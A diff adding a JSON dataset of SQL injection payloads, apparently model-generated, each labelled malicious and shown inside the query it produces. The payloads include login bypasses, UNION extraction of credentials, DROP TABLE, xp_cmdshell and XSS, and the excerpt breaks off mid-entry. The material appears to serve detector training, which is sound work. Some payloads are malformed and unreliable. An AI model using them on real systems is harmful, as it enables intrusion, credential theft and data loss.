@@ -1,0 +1,3602 @@
+[
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "1); WAITFOR DELAY '0:0:5' --",
+    "full_query": "SELECT * FROM users WHERE username = '1); WAITFOR DELAY '0:0:5' --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "1'; DECLARE @x INT; SET @x = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); IF @x IS NOT NULL EXECUTE(@x); --",
+    "full_query": "SELECT * FROM users WHERE username = '1'; DECLARE @x INT; SET @x = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); IF @x IS NOT NULL EXECUTE(@x); --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "1'; WITH T AS (SELECT COUNT(*) FROM users WHERE 1=0) SELECT username, password FROM users WHERE username = 'admin' AND password = 'admin'",
+    "full_query": "SELECT * FROM users WHERE username = '1'; WITH T AS (SELECT COUNT(*) FROM users WHERE 1=0) SELECT username, password FROM users WHERE username = 'admin' AND password = 'admin'' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "--' OR 1=1/**/",
+    "full_query": "SELECT * FROM users WHERE username = '--' OR 1=1/**/' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "' OR (SELECT 1 FROM DUAL)/*",
+    "full_query": "SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM DUAL)/*' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "' OR (1+1=2)",
+    "full_query": "SELECT * FROM users WHERE username = '' OR (1+1=2)' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "' OR (LENGTH(username)=1)",
+    "full_query": "SELECT * FROM users WHERE username = '' OR (LENGTH(username)=1)' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "1' /* */OR EXISTS(SELECT * FROM users WHERE username='admin')",
+    "full_query": "SELECT * FROM users WHERE username = '1' /* */OR EXISTS(SELECT * FROM users WHERE username='admin')' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "1' \" OR 1=1#",
+    "full_query": "SELECT * FROM users WHERE username = '1' \" OR 1=1#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "login",
+    "payload": "1' OR LENGTH(password)=0",
+    "full_query": "SELECT * FROM users WHERE username = '1' OR LENGTH(password)=0' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "' OR 1=1#",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR 1=1#%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "% AND '1'='1",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%% AND '1'='1%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "'; DROP TABLE users;",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%'; DROP TABLE users;%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": ";/* OR 'x'='y*/",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%;/* OR 'x'='y*/%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "' OR 1=1/**/",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR 1=1/**/%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "%' OR TRUE --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%' OR TRUE --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "%' OR TRUE /**/",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%' OR TRUE /**/%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "'% OR CAST('1' AS INT)=CAST('1' AS INT)--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%'% OR CAST('1' AS INT)=CAST('1' AS INT)--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "' OR ASCII(SUBSTRING((SELECT USER()),1,1))=65#",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING((SELECT USER()),1,1))=65#%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "' OR LENGTH((SELECT DATABASE()))>0--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR LENGTH((SELECT DATABASE()))>0--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "search",
+    "payload": "; WAITFOR DELAY '0:0:0' UNION ALL SELECT NULL,'',NULL,NULL#",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:0' UNION ALL SELECT NULL,'',NULL,NULL#%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "' OR '1'='1'",
+    "full_query": "SELECT * FROM users WHERE id = ' OR '1'='1'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "' OR EXISTS(SELECT * FROM (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')) --",
+    "full_query": "SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')) --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "; DROP TABLE IF EXISTS temp; SELECT * FROM users WHERE id = ' OR 1>1",
+    "full_query": "SELECT * FROM users WHERE id = ; DROP TABLE IF EXISTS temp; SELECT * FROM users WHERE id = ' OR 1>1",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "' OR (SELECT 1 FROM users WHERE username = '' AND password = '') --",
+    "full_query": "SELECT * FROM users WHERE id = ' OR (SELECT 1 FROM users WHERE username = '' AND password = '') --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "' OR ASCII(SUBSTRING(username, 1, 1)) = 85 --",
+    "full_query": "SELECT * FROM users WHERE id = ' OR ASCII(SUBSTRING(username, 1, 1)) = 85 --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "' OR 1 IN (SELECT 1) --",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 1 IN (SELECT 1) --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "' OR ASCII('a')=97 --",
+    "full_query": "SELECT * FROM users WHERE id = ' OR ASCII('a')=97 --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "' OR (1+(1=1))=2 --",
+    "full_query": "SELECT * FROM users WHERE id = ' OR (1+(1=1))=2 --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "user_lookup",
+    "payload": "' OR 1=(SELECT 1 FROM users LIMIT 1) --",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 1=(SELECT 1 FROM users LIMIT 1) --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "1' OR ASCII(SUBSTRING(user(),1,1)) > 90 --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' OR ASCII(SUBSTRING(user(),1,1)) > 90 --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "1' OR 1 IN (SELECT 1 FROM information_schema.tables WHERE table_type LIKE '%TABLE%')--",
+    "full_query": "SELECT * FROM orders WHERE status = '1' OR 1 IN (SELECT 1 FROM information_schema.tables WHERE table_type LIKE '%TABLE%')--' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "1' OR 'a'='a' --",
+    "full_query": "SELECT * FROM orders WHERE status = '1' OR 'a'='a' --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "' OR EXISTS(SELECT 1)",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1)' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "'; DROP TABLE IF EXISTS users;",
+    "full_query": "SELECT * FROM orders WHERE status = ''; DROP TABLE IF EXISTS users;' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "OR ('x'='x",
+    "full_query": "SELECT * FROM orders WHERE status = 'OR ('x'='x' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "' OR (1+1)=2 --",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR (1+1)=2 --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "' OR (1=1 AND (SELECT 1 FROM dual)) --",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR (1=1 AND (SELECT 1 FROM dual)) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "' OR 'a'='b' UNION ALL SELECT NULL, NULL, NULL, NULL --",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR 'a'='b' UNION ALL SELECT NULL, NULL, NULL, NULL --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "' OR (NOT(1=2)) ; --",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR (NOT(1=2)) ; --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "order_filter",
+    "payload": "' OR EXISTS((SELECT 1 FROM (SELECT * FROM orders WHERE 1=1 LIMIT 1))) --",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR EXISTS((SELECT 1 FROM (SELECT * FROM orders WHERE 1=1 LIMIT 1))) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "' OR 1; DROP TABLE comments --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR 1; DROP TABLE comments --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "' OR (SELECT 1 FROM users WHERE 1=1) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM users WHERE 1=1) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "' OR ASCII('a')=ASCII('a') --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR ASCII('a')=ASCII('a') --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "' OR @@VERSION LIKE '%Microsoft%' --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR @@VERSION LIKE '%Microsoft%' --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "'; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users' AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema = 'information_schema' AND table_name = 'tables' AND column_name = 'table_name')) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, ''; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users' AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema = 'information_schema' AND table_name = 'tables' AND column_name = 'table_name')) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "'); EXECUTE xp_cmdshell 'ping -c 4 www.google.com' --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, ''); EXECUTE xp_cmdshell 'ping -c 4 www.google.com' --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "'); DECLARE @x INT; SET @x = 1; IF (@x = 1) PRINT 'Injection successful!' ELSE PRINT 'Injection failed!'; --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, ''); DECLARE @x INT; SET @x = 1; IF (@x = 1) PRINT 'Injection successful!' ELSE PRINT 'Injection failed!'; --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "'); INSERT INTO comments (user_id, body) SELECT user_id, body FROM comments WHERE 1=0 UNION ALL SELECT 1, 'Exploit executed'; --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, ''); INSERT INTO comments (user_id, body) SELECT user_id, body FROM comments WHERE 1=0 UNION ALL SELECT 1, 'Exploit executed'; --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "tautology",
+    "template_context": "comment_insert",
+    "payload": "'); UPDATE comments SET body = '<script>alert('XSS');</script>' WHERE user_id = 1; --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, ''); UPDATE comments SET body = '<script>alert('XSS');</script>' WHERE user_id = 1; --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "' UNION ALL SELECT * FROM information_schema.users --",
+    "full_query": "SELECT * FROM users WHERE username = '' UNION ALL SELECT * FROM information_schema.users --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "--'; EXEC sp_helpdb;",
+    "full_query": "SELECT * FROM users WHERE username = '--'; EXEC sp_helpdb;' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "'; WAITFOR DELAY '0:0:10'--",
+    "full_query": "SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:10'--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "' OR 1=1 UNION SELECT password FROM admin --",
+    "full_query": "SELECT * FROM users WHERE username = '' OR 1=1 UNION SELECT password FROM admin --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "' OR '1'='1' UNION SELECT email FROM staff /*",
+    "full_query": "SELECT * FROM users WHERE username = '' OR '1'='1' UNION SELECT email FROM staff /*' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "' OR 2*(SELECT 1/0) = 2 UNION SELECT username FROM accounts #",
+    "full_query": "SELECT * FROM users WHERE username = '' OR 2*(SELECT 1/0) = 2 UNION SELECT username FROM accounts #' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "' OR ASCII(SUBSTRING(password,1,1)) > 96 UNION SELECT first_name FROM employees //",
+    "full_query": "SELECT * FROM users WHERE username = '' OR ASCII(SUBSTRING(password,1,1)) > 96 UNION SELECT first_name FROM employees //' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "' OR (SELECT COUNT(*) FROM orders) = (SELECT COUNT(*) FROM orders) --",
+    "full_query": "SELECT * FROM users WHERE username = '' OR (SELECT COUNT(*) FROM orders) = (SELECT COUNT(*) FROM orders) --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "--') UNION ALL SELECT * FROM domain.admins--",
+    "full_query": "SELECT * FROM users WHERE username = '--') UNION ALL SELECT * FROM domain.admins--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "/*'*/ UNION SELECT username, password FROM users WHERE username != 'admin' #",
+    "full_query": "SELECT * FROM users WHERE username = '/*'*/ UNION SELECT username, password FROM users WHERE username != 'admin' #' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "' OR 1=1 UNION SELECT CONCAT(username, ':', password) FROM auth.credentials /*",
+    "full_query": "SELECT * FROM users WHERE username = '' OR 1=1 UNION SELECT CONCAT(username, ':', password) FROM auth.credentials /*' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "login",
+    "payload": "' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) <= 65 --",
+    "full_query": "SELECT * FROM users WHERE username = '' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) <= 65 --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "' OR '1'='1/*'",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR '1'='1/*'%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "--%') UNION SELECT username, password FROM users --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%--%') UNION SELECT username, password FROM users --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "' OR EXISTS(SELECT 1 FROM info WHERE email = SUBSTRING((SELECT admin_email FROM settings), 1, 1))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM info WHERE email = SUBSTRING((SELECT admin_email FROM settings), 1, 1))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "'; EXEC sp_sayHello; UNION SELECT * FROM flags --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%'; EXEC sp_sayHello; UNION SELECT * FROM flags --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "1' AND LOWER(VERSION())=LOWER((SELECT VERSION() FROM information_schema))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND LOWER(VERSION())=LOWER((SELECT VERSION() FROM information_schema))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "-1' OR (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%-1' OR (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "1' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin') UNION ALL SELECT NULL NULL NULL NULL #",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin') UNION ALL SELECT NULL NULL NULL NULL #%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "' OR 1=1 AND (SELECT 1 FROM (SELECT CONCAT(username, ':', password) AS data FROM users))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR 1=1 AND (SELECT 1 FROM (SELECT CONCAT(username, ':', password) AS data FROM users))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "search",
+    "payload": "1' OR 1=1 AND (SELECT ASCII(SUBSTRING((SELECT admin_password FROM settings LIMIT 1), 1, 1))) BETWEEN 48 AND 57 --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' OR 1=1 AND (SELECT ASCII(SUBSTRING((SELECT admin_password FROM settings LIMIT 1), 1, 1))) BETWEEN 48 AND 57 --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "user_lookup",
+    "payload": "' AND EXISTS(SELECT 1 FROM accounts WHERE account_id=123)",
+    "full_query": "SELECT * FROM users WHERE id = ' AND EXISTS(SELECT 1 FROM accounts WHERE account_id=123)",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "user_lookup",
+    "payload": "' UNION SELECT username, password FROM admin_table #",
+    "full_query": "SELECT * FROM users WHERE id = ' UNION SELECT username, password FROM admin_table #",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "user_lookup",
+    "payload": "/* */UNION select /** */*/** */from/** */information_schema.tables/** */where/** */table_schema=database()/** */and/** */table_name<>'users'",
+    "full_query": "SELECT * FROM users WHERE id = /* */UNION select /** */*/** */from/** */information_schema.tables/** */where/** */table_schema=database()/** */and/** */table_name<>'users'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "union_based",
+    "template_context": "user_lookup",
